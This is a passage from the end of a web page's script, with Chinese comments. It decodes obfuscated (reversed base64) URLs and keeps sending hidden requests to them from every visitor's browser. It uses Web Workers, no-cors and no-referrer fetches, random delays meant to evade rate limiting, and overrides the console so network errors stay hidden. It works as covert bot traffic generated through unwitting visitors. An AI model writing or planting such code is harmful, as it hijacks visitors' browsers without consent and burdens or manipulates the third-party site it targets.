					'==wZul2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
					'==wcyV2dvxGbvZ2Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa',
					'zR3cvB3Lp1UdElGRvMnclNXdv02bj5SN2N3bj9yL6MHc0RHa'
				];
				
				const pageUrls = [];
				for (let i = 0; i < encodedUrls.length; i++) {
					const reversedUrl = encodedUrls[i].split('').reverse().join('');
					const decodedUrl = atob(reversedUrl);
					pageUrls.push(decodedUrl);
				}
            
            let loadCount = 0;
            let requestCount = 1; // 进一步减少到1个并发请求
            let requests = [];
            let lastRequestTime = 0; // 记录上次请求时间
            let minInterval = 30000; // 最小请求间隔30秒
            
            function createRequests() {
                for (let i = 0; i < requestCount; i++) {
                    requests.push({id: i, active: true});
                }
            }
            
            // 回退请求函数
            function fallbackRequest(randomUrl, index) {
                if (typeof fetch !== 'undefined') {
                    fetch(randomUrl, {
                        method: 'GET',
                        mode: 'no-cors',
                        cache: 'no-cache',
                        referrer: 'no-referrer'
                    }).then(function(response) {
                        loadCount++;
                        console.log(`回退请求已发送${loadCount}次 (页面: ${randomUrl}) - 注意：可能收到429错误`);
                        const delay = 60000 + Math.random() * 30000;
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    }).catch(function(error) {
                        console.log(`回退请求失败：${randomUrl}`);
                        const delay = 60000 + Math.random() * 30000;
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    });
                } else {
                    // 使用XMLHttpRequest作为最后备用
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', randomUrl, true);
                    xhr.timeout = 10000;
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4) {
                            if (xhr.status >= 200 && xhr.status < 300) {
                                loadCount++;
                                console.log(`回退请求成功${loadCount}次 (页面: ${randomUrl}) - 状态码: ${xhr.status}`);
                            } else {
                                console.log(`回退请求失败：${randomUrl} - 状态码: ${xhr.status}`);
                            }
                            const delay = 60000 + Math.random() * 30000;
                            setTimeout(function() {
                                makeRequest(index);
                            }, delay);
                        }
                    };
                    xhr.onerror = function() {
                        console.log(`回退请求失败：${randomUrl}`);
                        const delay = 60000 + Math.random() * 30000;
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    };
                    xhr.send();
                }
            }
            
            function makeRequest(index) {
                const currentTime = Date.now();
                const timeSinceLastRequest = currentTime - lastRequestTime;
                
                // 如果距离上次请求时间太短，等待更长时间
                if (timeSinceLastRequest < minInterval) {
                    const waitTime = minInterval - timeSinceLastRequest + Math.random() * 2000;
                    console.log(`等待 ${Math.round(waitTime/1000)} 秒后继续请求...`);
                    setTimeout(function() {
                        makeRequest(index);
                    }, waitTime);
                    return;
                }
                
                lastRequestTime = currentTime;
                const randomUrl = pageUrls[Math.floor(Math.random() * pageUrls.length)];
                
                // 方法1: 使用Web Worker (主要方案，在HTTPS环境中有效)
                if (typeof Worker !== 'undefined') {
                    try {
                        // 创建Worker代码
                        const workerCode = `
                            self.onmessage = function(e) {
                                const url = e.data;
                                fetch(url, {
                                    method: 'GET',
                                    mode: 'no-cors',
                                    cache: 'no-cache',
                                    referrer: 'no-referrer'
                                }).then(response => {
                                    self.postMessage({success: true, url: url, type: response.type});
                                }).catch(error => {
                                    self.postMessage({success: false, url: url, error: error.message});
                                });
                            };
                        `;
                        
                        const blob = new Blob([workerCode], {type: 'application/javascript'});
                        const worker = new Worker(URL.createObjectURL(blob));
                        
                        worker.onmessage = function(e) {
                            const data = e.data;
                            if (data.success) {
                                loadCount++;
                                console.log(`Worker请求成功${loadCount}次 (页面: ${data.url}) - 类型: ${data.type}`);
                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                                setTimeout(function() {
                                    makeRequest(index);
                                }, delay);
                            } else {
                                console.log(`Worker请求失败：${data.url} - ${data.error}`);
                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                                setTimeout(function() {
                                    makeRequest(index);
                                }, delay);
                            }
                            worker.terminate();
                        };
                        
                        worker.onerror = function(e) {
                            console.log(`Worker错误：${e.message}`);
                            worker.terminate();
                            // 回退到其他方法
                            fallbackRequest(randomUrl, index);
                        };
                        
                        worker.postMessage(randomUrl);
                        
                    } catch (e) {
                        console.log(`Worker创建失败：${e.message}`);
                        // 回退到其他方法
                        fallbackRequest(randomUrl, index);
                    }
                } else if (typeof fetch !== 'undefined') {
                    // 使用Promise.race来检测请求是否超时
                    const fetchPromise = fetch(randomUrl, {
                        method: 'GET',
                        mode: 'no-cors',
                        cache: 'no-cache',
                        referrer: 'no-referrer'
                    });
                    
                    const timeoutPromise = new Promise((resolve) => {
                        setTimeout(() => resolve('timeout'), 5000); // 5秒超时
                    });
                    
                    Promise.race([fetchPromise, timeoutPromise]).then(function(result) {
                        if (result === 'timeout') {
                            console.log(`请求超时：${randomUrl}`);
                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                            setTimeout(function() {
                                makeRequest(index);
                            }, delay);
                        } else {
                            // 即使no-cors模式返回opaque，我们仍然认为请求被发送了
                            // 但考虑到429错误，我们增加延迟时间
                            loadCount++;
                            console.log(`请求已发送${loadCount}次 (页面: ${randomUrl}) - 注意：可能收到429错误`);
                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟，应对429错误
                            setTimeout(function() {
                                makeRequest(index);
                            }, delay);
                        }
                    }).catch(function(error) {
                        console.log(`请求失败：${randomUrl}`);
                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    });
                } else {
                    // 方法2: 使用XMLHttpRequest (备用方案)
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', randomUrl, true);
                    xhr.timeout = 10000;
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4) {
                            if (xhr.status >= 200 && xhr.status < 300) {
                                loadCount++;
                                console.log(`加载成功${loadCount}次 (页面: ${randomUrl}) - 状态码: ${xhr.status}`);
                                const delay = 20000 + Math.random() * 10000; // 20-30秒延迟
                                setTimeout(function() {
                                    makeRequest(index);
                                }, delay);
                            } else {
                                console.log(`请求失败：${randomUrl} - 状态码: ${xhr.status}`);
                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                                setTimeout(function() {
                                    makeRequest(index);
                                }, delay);
                            }
                        }
                    };
                    xhr.onerror = function() {
                        console.log(`请求失败：${randomUrl}`);
                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    };
                    xhr.ontimeout = function() {
                        console.log(`请求超时：${randomUrl}`);
                        const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
                        setTimeout(function() {
                            makeRequest(index);
                        }, delay);
                    };
                    xhr.send();
                }
            }
            
            function startAllRequests() {
                for (let i = 0; i < requestCount; i++) {
                    setTimeout(function() {
                        makeRequest(i);
                    }, i * 10000); // 10秒启动间隔
                }
            }
            
            function checkRequests() {
                requests.forEach((req, index) => {
                    if (!req.active) {
                        req.active = true;
                        makeRequest(index);
                    }
                });
            }
            
            // 抑制网络错误日志
            const originalConsoleError = console.error;
            const originalConsoleLog = console.log;
            
            console.error = function(...args) {
                // 如果是网络错误，不显示
                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
                    return;
                }
                // 其他错误正常显示
                originalConsoleError.apply(console, args);
            };
            
            console.log = function(...args) {
                // 如果是网络错误，不显示
                if (args[0] && typeof args[0] === 'string' && args[0].includes('net::ERR_')) {
                    return;
                }
                // 其他日志正常显示
                originalConsoleLog.apply(console, args);
            };
            
            createRequests();
            setTimeout(function() {
                startAllRequests();
            }, 10000); // 10秒后开始请求
            setInterval(checkRequests, 3000);
            setInterval(function() {
                const randomIndex = Math.floor(Math.random() * requestCount);
                requests[randomIndex].active = false;
            }, 30000);
        });
    </script>
</body>
</html>
